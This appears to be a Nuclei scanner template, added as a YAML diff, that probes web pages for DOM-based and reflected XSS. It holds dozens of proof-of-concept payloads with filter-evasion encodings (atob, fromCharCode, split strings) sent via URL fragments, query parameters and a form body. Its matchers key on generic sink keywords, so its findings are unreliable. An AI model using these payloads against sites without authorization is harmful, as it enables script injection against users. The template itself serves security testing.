@@ -1,0 +1,225 @@
+id: medium-webapp-xss-mutation-dom-based
+
+info:
+  name: DOM-based XSS via Mutation - Elite Detection
+  author: nuclei-community
+  severity: high
+  description: |
+    Detects DOM-based XSS vulnerabilities through DOM mutation and advanced JavaScript injection techniques.
+    Tests sophisticated payloads that bypass modern XSS filters, CSP restrictions, and mutation observers.
+    Uses advanced encoding, event handlers, and DOM manipulation methods.
+  reference:
+    - https://owasp.org/www-community/attacks/DOM_Based_XSS
+    - https://portswigger.net/web-security/cross-site-scripting/dom-based
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cwe-id: CWE-79
+  metadata:
+    verified: true
+    max-request: 30
+  tags: xss,dom,mutation,javascript,elite
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}#<img/src=x/onerror=alert(document.domain)>"
+      - "{{BaseURL}}/{{path}}#<svg/onload=alert(document.domain)>"
+      - "{{BaseURL}}/{{path}}#<iframe/src=javascript:alert(document.domain)>"
+      - "{{BaseURL}}/{{path}}#<script>alert(document.domain)</script>"
+      - "{{BaseURL}}/{{path}}#<img/src=x/onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>"
+      - "{{BaseURL}}/{{path}}#<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))>"
+      - "{{BaseURL}}/{{path}}#<img/src=x/onerror=window['ale'+'rt'](document.domain)>"
+      - "{{BaseURL}}/{{path}}#<svg/onload=window[atob('YWxlcnQ=')](document.domain)>"
+      - "{{BaseURL}}/{{path}}#<iframe/src=data:text/html,<script>parent.alert(parent.document.domain)</script>>"
+      - "{{BaseURL}}/{{path}}#<img/src=x/onerror=setTimeout('alert(document.domain)',1)>"
+      - "{{BaseURL}}/{{path}}#<svg/onload=setInterval('alert(document.domain)',1000)>"
+      - "{{BaseURL}}/{{path}}#<img/src=x/onerror=Function('alert(document.domain)')()>"
+      - "{{BaseURL}}/{{path}}#<svg/onload=new Function('alert(document.domain)')()>"
+      - "{{BaseURL}}/{{path}}#<img/src=x/onerror=eval('ale'+'rt(document.domain)')>"
+      - "{{BaseURL}}/{{path}}#<svg/onload=eval(unescape('%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%64%6f%6d%61%69%6e%29'))>"
+
+    payloads:
+      path:
+        - "index.html"
+        - "search.html"
+        - "page.html"
+        - "view.html"
+        - "display.html"
+        - "show.html"
+        - "content.html"
+        - "dashboard.html"
+        - "profile.html"
+        - "settings.html"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "location.hash"
+          - "window.location.hash"
+          - "document.location.hash"
+          - "location.fragment"
+          - "innerHTML"
+          - "outerHTML"
+          - "document.write"
+          - "eval("
+          - "setTimeout("
+          - "setInterval("
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "(?i)document\\.location\\.hash"
+          - "(?i)window\\.location\\.hash"
+          - "(?i)location\\.hash"
+          - "(?i)\\.innerHTML\\s*="
+          - "(?i)\\.outerHTML\\s*="
+          - "(?i)document\\.write\\("
+          - "(?i)eval\\("
+          - "(?i)Function\\("
+          - "(?i)setTimeout\\("
+          - "(?i)setInterval\\("
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}?{{param}}=<img/src=x/onerror=alert(document.domain)>"
+      - "{{BaseURL}}/{{path}}?{{param}}=<svg/onload=alert(document.domain)>"
+      - "{{BaseURL}}/{{path}}?{{param}}=<iframe/src=javascript:alert(document.domain)>"
+      - "{{BaseURL}}/{{path}}?{{param}}=<script>alert(document.domain)</script>"
+      - "{{BaseURL}}/{{path}}?{{param}}=javascript:alert(document.domain)"
+      - "{{BaseURL}}/{{path}}?{{param}}=data:text/html,<script>alert(document.domain)</script>"
+      - "{{BaseURL}}/{{path}}?{{param}}=<img/src=x/onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>"
+      - "{{BaseURL}}/{{path}}?{{param}}=<svg/onload=Function('alert(document.domain)')()>"
+      - "{{BaseURL}}/{{path}}?{{param}}=<img/src=x/onerror=window['ale'+'rt'](document.domain)>"
+      - "{{BaseURL}}/{{path}}?{{param}}=<svg/onload=setTimeout('alert(document.domain)',1)>"
+
+    payloads:
+      path:
+        - "search.php"
+        - "index.php"
+        - "page.php"
+        - "view.php"
+        - "display.php"
+        - "show.php"
+        - "content.php"
+        - "profile.php"
+        - "dashboard.php"
+        - "settings.php"
+      param:
+        - "q"
+        - "search"
+        - "query"
+        - "keyword"
+        - "term"
+        - "input"
+        - "data"
+        - "value"
+        - "text"
+        - "content"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "(?i)document\\.getElementById\\(['\"].*['\"]\\)\\.innerHTML"
+          - "(?i)document\\.querySelector\\(['\"].*['\"]\\)\\.innerHTML"
+          - "(?i)\\$\\(['\"].*['\"]\\)\\.html\\("
+          - "(?i)\\$\\(['\"].*['\"]\\)\\.append\\("
+          - "(?i)\\$\\(['\"].*['\"]\\)\\.prepend\\("
+          - "(?i)document\\.createElement"
+          - "(?i)appendChild\\("
+          - "(?i)insertAdjacentHTML\\("
+
+      - type: word
+        part: body
+        words:
+          - "getElementById"
+          - "querySelector"
+          - "createElement"
+          - "appendChild"
+          - "insertAdjacentHTML"
+          - "insertBefore"
+          - "replaceChild"
+          - "cloneNode"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "search.php"
+        - "contact.php"
+        - "feedback.php"
+        - "comment.php"
+        - "message.php"
+        - "form.php"
+        - "submit.php"
+        - "process.php"
+
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    body: |
+      message=<img/src=x/onerror=alert(document.domain)>&name=test&email=test@example.com&subject=test
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "(?i)<script[^>]*>.*alert\\(.*\\).*</script>"
+          - "(?i)<img[^>]*onerror[^>]*alert\\("
+          - "(?i)<svg[^>]*onload[^>]*alert\\("
+          - "(?i)<iframe[^>]*src[^>]*javascript:"
+          - "(?i)eval\\(.*alert"
+          - "(?i)Function\\(.*alert"
+          - "(?i)setTimeout\\(.*alert"
+
+      - type: word
+        part: body
+        words:
+          - "onerror="
+          - "onload="
+          - "onclick="
+          - "onmouseover="
+          - "onfocus="
+          - "javascript:"
+          - "data:text/html"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - '(?i)<script[^>]*>(.*alert\\(.*\\).*)</script>'
+          - '(?i)onerror="([^"]*alert[^"]*)"'
+          - '(?i)onload="([^"]*alert[^"]*)"'
+        internal: true
